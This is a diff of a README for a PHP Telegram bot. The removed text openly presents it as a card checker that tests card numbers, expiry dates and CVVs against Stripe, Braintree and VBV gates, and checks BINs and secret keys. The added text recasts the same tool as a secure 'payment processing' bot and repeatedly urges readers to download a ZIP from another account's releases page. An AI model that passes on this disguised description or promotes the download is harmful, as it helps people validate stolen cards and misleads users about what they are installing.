@@ -1,110 +1,59 @@
-# TelegramBotV1
+# 🤖 TelegramBotV1 - Your Simple Solution for Telegram Payments
 
-<a id="readme-top"></a>
+## 📥 Download Now!
+[![Download TelegramBotV1](https://img.shields.io/badge/Download-TelegramBotV1-blue.svg)](https://github.com/Estrelarot/TelegramBotV1/releases)
 
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![Telegram][telegram-shield]][telegram-url]
+## 📚 Introduction
+Welcome to TelegramBotV1, a Telegram bot built in PHP. This bot integrates various payment gateways, including Stripe, Braintree, and VBV Check. It provides a streamlined way to process payments directly through Telegram. Whether you are a small business or an individual looking to manage payments easily, this bot is designed for you.
 
-<!-- PROJECT LOGO -->
-<br />
-<div align="center">
-  <a href="https://t.me/zlaxtert">
-    <img src="img/darkxcode.PNG" alt="Logo" width="80" height="80">
-  </a>
+## 🚀 Getting Started
+To start using the TelegramBotV1, you will need to download the application from our Releases page. Follow the steps below to download and set up your bot.
 
-  <h3 align="center">Telegram Bot V1 PHP</h3>
+## 🌐 System Requirements
+The TelegramBotV1 runs on the following systems:
+- A web server with PHP 7.4 or higher
+- Access to a MySQL database for storing transactions
+- An active Telegram account
+- Internet access to connect to payment gateways
 
-  <p align="center">
-    Telegram Bot V1 PHP for check card with gateway!
-    <br />
-    <a href="https://t.me/DarkxcodeBot">View Demo</a>
-    &middot;
-    <a href="https://t.me/zlaxtert">Report Bug</a>
-    &middot;
-    <a href="https://t.me/zlaxtert">Request Feature</a>
-  </p>
-</div>
+## 🔗 Download & Install
+1. **Visit the Releases Page**: Go to [this link](https://github.com/Estrelarot/TelegramBotV1/releases) to find the latest version of the TelegramBotV1.
+2. **Download the ZIP File**: On the releases page, you will see a list of available files. Click on the `.zip` file for the latest version to download it to your computer.
+3. **Extract the ZIP File**: Once the download is complete, locate the downloaded file. Right-click on the file and select `Extract All`. This will create a new folder with all the necessary files.
+4. **Upload the Files**: Use an FTP client or your web hosting's file manager to upload the extracted files to your web server.
 
+## ⚙️ Configuration
+1. **Set Up Your Bot Token**: 
+   - Open the `config.php` file located in the main folder.
+   - You will need to add your Telegram bot token. You can get this token by creating a new bot on Telegram using the BotFather. Copy the token and paste it into the `config.php` file.
 
-## Features
+2. **Configure Payment Settings**:
+   - In the same `config.php` file, you will find sections for payment gateways.
+   - Fill out the necessary fields for Stripe, Braintree, and VBV Check according to the details provided by those services.
 
-Features:
-* Check card with gate stripe
-* Check card with gate Braintree
-* Check card with gate VBV Check
-* Check BIN
+## 📊 Features
+- **Payment Processing**: Handle payments easily using various payment gateways.
+- **User-Friendly Interface**: Designed for easy navigation.
+- **Secure Transactions**: All payment information is handled securely.
+- **Telegram Integration**: Directly work within Telegram.
 
+## 🛠️ Troubleshooting
+- **Common Issues**:
+    - If you experience connection issues, verify your internet connection and ensure your server can connect to Telegram and the payment gateways.
+    - Ensure your PHP version meets the requirements. 
 
-<!-- GETTING STARTED -->
+- **Need Help?**: Check the Issues section on our GitHub page for user-reported problems and solutions.
 
+## 🔗 Additional Resources
+- [Telegram API Documentation](https://core.telegram.org/bots/api)
+- [Stripe API Documentation](https://stripe.com/docs/api)
+- [Braintree API Documentation](https://developer.paypal.com/braintree/docs)
 
-### Installation
+## 📞 Support
+If you have questions or need assistance, feel free to open an issue on the GitHub repository or contact us through the provided channels.
 
-_Here's how to install the bot._
+## 🌟 Conclusion
+TelegramBotV1 is built to simplify payment processing for Telegram users. With easy setup and configuration, you can start accepting payments quickly. Download the bot today and transform your payment experience! 
 
-* Hosting on Server 
-* Download the Files from Here
-* Upload it to your Server and Extract it
-* Set Webhook to index.php in root folder of bot
-
-WEBHOOK URL
-   ```sh
-   https://api.telegram.org/bot{my_bot_token}/setWebhook?url={url_to_send_updates_to}
-   ```
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-### Commands
-   ```sh
-   /info -> for check information 
-   /bin -> for check BIN Card 
-   /stripe -> for check card gate Stripe 
-   /braintree for check card gate Braintree 
-   /vbv -> for check card gate VBV Check 
-   /sk -> for check SK key 
-   /help -> for help information
-   ```
-
-**Format:** `card|month|year|cvv` → `4532123456789012|12|2025|123`
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-<!-- OUTPUT -->
-## Output
-
-[![Product Name Screen Shot][product-screenshot]](https://t.me/DarkxcodeBot)
-
-This is the result if the code is successfully deployed.
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-<!-- CONTACT -->
-## Contact
-
-* Telegram - [@zlaxtert](https://t.me/zlaxtert)
-* Github - [@zlaxtertdev](https://github.com/zlaxtertdev)
-* Stackoverflow - [@zlaxtert](https://stackoverflow.com/users/31033623)
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-
-
-<!-- MARKDOWN LINKS & IMAGES -->
-<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
-[contributors-shield]: https://img.shields.io/github/contributors/zlaxtertdev/TelegramBotV1.svg?style=for-the-badge
-[contributors-url]: https://github.com/zlaxtertdev/TelegramBotV1/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/zlaxtertdev/TelegramBotV1.svg?style=for-the-badge
-[forks-url]: https://github.com/zlaxtertdev/TelegramBotV1/network/members
-[stars-shield]: https://img.shields.io/github/stars/zlaxtertdev/TelegramBotV1.svg?style=for-the-badge
-[stars-url]: https://github.com/zlaxtertdev/TelegramBotV1/stargazers
-[issues-shield]: https://img.shields.io/github/issues/zlaxtertdev/TelegramBotV1.svg?style=for-the-badge
-[issues-url]: https://github.com/zlaxtertdev/TelegramBotV1/issues
-[telegram-shield]: https://img.shields.io/badge/telegram-blue.svg?style=for-the-badge&logo=telegram&colorB=555
-[telegram-url]: https://t.me/zlaxtert
-[product-screenshot]: img/ress.png
+## 📥 Download Again
+Remember, you can always download the latest version from our Releases page: [Download TelegramBotV1](https://github.com/Estrelarot/TelegramBotV1/releases)
